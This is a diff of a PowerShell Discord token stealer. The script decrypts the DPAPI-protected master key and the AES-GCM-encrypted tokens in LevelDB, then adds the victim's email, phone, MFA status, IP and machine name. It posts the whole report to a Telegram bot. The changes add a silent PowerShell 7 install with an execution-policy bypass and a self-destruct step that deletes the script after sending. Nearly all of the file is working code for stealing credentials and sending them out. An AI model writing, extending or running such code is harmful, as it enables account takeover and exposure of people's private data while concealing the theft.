@@ -1,13 +1,15 @@
 <#
 .SYNOPSIS
-    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata.
+    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata, auto-installs PowerShell 7+, and self-destructs.
 
 .DESCRIPTION
+    - Ensures PowerShell 7+ is installed; if not, installs and reruns under it.
     - Reads Discord’s encrypted Local State to retrieve the DPAPI-protected master key.
     - Decrypts the master key using Windows DPAPI.
     - Scans the LevelDB folder for AES-GCM–encrypted token blobs.
     - Decrypts the blobs to recover Discord tokens.
-    - Either prints the first token locally (DryRun) or sends it and user info to a Telegram chat via the Bot API.
+    - Sends the token and enriched metadata to a Telegram chat via the Bot API.
+    - Deletes the script file from disk after sending the report.
 
 .PARAMETER botToken
     Your Telegram Bot API token.
@@ -26,20 +28,39 @@ param(
     [switch] $DryRun
 )
 
-# Ensure correct platform
+function Install-PowerShell7 {
+    if ($PSVersionTable.PSVersion.Major -ge 7) { return }
+    Write-Host 'PowerShell 7+ not detected. Installing...'
+    if (Get-Command winget -ErrorAction SilentlyContinue) {
+        Write-Host 'Installing PowerShell 7 via winget...'
+        Start-Process winget -ArgumentList 'install','--id','Microsoft.Powershell','-e','--silent' -Wait
+    } else {
+        Write-Host 'Downloading PowerShell 7 MSI...'
+        $url = 'https://github.com/PowerShell/PowerShell/releases/latest/download/PowerShell-7.4.5-win-x64.msi'
+        $tmp = Join-Path $env:TEMP 'pwsh.msi'
+        Invoke-RestMethod -Uri $url -OutFile $tmp
+        Start-Process msiexec.exe -ArgumentList '/i', "`"$tmp`"", '/qn' -Wait
+        Remove-Item $tmp -Force
+    }
+    $pwshExe = (Get-Command pwsh -ErrorAction Stop).Source
+    Write-Host "Re-launching under $pwshExe..."
+    & $pwshExe -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @PSBoundParameters
+    exit
+}
+
+# Bootstrap PowerShell 7+
+Install-PowerShell7
+
+# Confirm environment
 if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
     Write-Error 'Requires PowerShell 7+ on Windows'
     exit 1
 }
 
-# Determine AppData path explicitly
+# Setup
 $appData = [Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
 Write-Verbose "Using AppData path: $appData"
-
-# Enforce TLS 1.2 for HTTPS
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# DPAPI unprotect delegate
 Add-Type -AssemblyName System.Security
 $Unprotect = [System.Security.Cryptography.ProtectedData]::Unprotect
 
@@ -63,7 +84,6 @@ function Convert-EncryptedBlob {
         [byte[]] $Blob,
         [byte[]] $Key
     )
-    # Blob format: [3-byte prefix][12-byte IV][ciphertext][16-byte tag]
     $iv     = $Blob[3..14]
     $cipher = $Blob[15..($Blob.Length - 17)]
     $tag    = $Blob[($Blob.Length - 16)..($Blob.Length - 1)]
@@ -115,24 +135,10 @@ function Get-DiscordUserInfo {
         Write-Verbose "Failed to fetch user info: $_"
         return @{}
     }
-    $guildCount = 0
-    $hasNitro   = $false
-    try {
-        $guilds = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $headers -UseBasicParsing -ErrorAction Stop
-        $guildCount = $guilds.Count
-    } catch {}
-    try {
-        $subs    = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $headers -UseBasicParsing -ErrorAction Stop
-        $hasNitro = ($subs.Count -gt 0)
-    } catch {}
-    return @{ 
-        username   = "$($user.username)#$($user.discriminator)";
-        email      = $user.email;
-        phone      = $user.phone;
-        mfa        = $user.mfa_enabled;
-        guildCount = $guildCount;
-        hasNitro   = $hasNitro;
-    }
+    $guildCount = 0; $hasNitro = $false
+    try { $guilds = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $headers -UseBasicParsing -ErrorAction Stop; $guildCount = $guilds.Count } catch {}
+    try { $subs    = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $headers -UseBasicParsing -ErrorAction Stop; $hasNitro = ($subs.Count -gt 0) } catch {}
+    return @{ username = "$($user.username)#$($user.discriminator)"; email = $user.email; phone = $user.phone; mfa = $user.mfa_enabled; guildCount = $guildCount; hasNitro = $hasNitro }
 }
 
 function Invoke-DiscordTokenReport {
@@ -140,20 +146,19 @@ function Invoke-DiscordTokenReport {
         [string] $Source,
         [string] $Token
     )
-    $publicIP       = Get-PublicIP
-    $timestamp      = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-    $info           = Get-DiscordUserInfo -Token $Token
-    $userName       = $env:USERNAME
-    $computerName   = $env:COMPUTERNAME
+    $publicIP     = Get-PublicIP
+    $timestamp    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    $info         = Get-DiscordUserInfo -Token $Token
+    $userName     = $env:USERNAME
+    $computerName = $env:COMPUTERNAME
 
-    # Compose HTML-formatted message to avoid Markdown parsing issues
     $message = @"
+<b>Source:</b> $Source
 <b>Token:</b> $Token
 
 <b>Account:</b> $($info.username)
 <b>Email:</b> $($info.email)
 <b>Phone:</b> $($info.phone)
-
 <b>MFA:</b> $($info.mfa)
 <b>Guilds:</b> $($info.guildCount)
 <b>Nitro:</b> $($info.hasNitro)
@@ -166,11 +171,11 @@ function Invoke-DiscordTokenReport {
     $uri  = "https://api.telegram.org/bot$botToken/sendMessage"
     $body = @{ chat_id = $chatId; text = $message; parse_mode = 'HTML' } | ConvertTo-Json
     Write-Verbose "Posting report to Telegram"
-    try {
-        Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
-    } catch {
-        Write-Error "Failed to send report: $_"
-    }
+    try { Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null } catch { Write-Error "Failed to send report: $_" }
+
+    # Self-destruct
+    Write-Verbose "Deleting script file $PSCommandPath"
+    Remove-Item -LiteralPath $PSCommandPath -Force
 }
 
 # Main execution
@@ -180,7 +185,6 @@ $installDirs = @(
     "$appData\discordptb",
     "$appData\Lightcord"
 )
-
 foreach ($dir in $installDirs) {
     if (Test-Path $dir) {
         Write-Verbose "Checking installation at $dir"
@@ -188,15 +192,11 @@ foreach ($dir in $installDirs) {
         if ($masterKey) {
             $token = Get-DiscordTokens -BasePath $dir -Key $masterKey
             if ($token) {
-                if ($DryRun) {
-                    Write-Host "[DryRun] Token: $token"
-                    exit 0
-                }
+                if ($DryRun) { Write-Host "[DryRun] Token: $token"; exit 0 }
                 Invoke-DiscordTokenReport -Source $dir -Token $token
                 exit 0
             }
         }
     }
 }
-
 Write-Host 'No token found.'
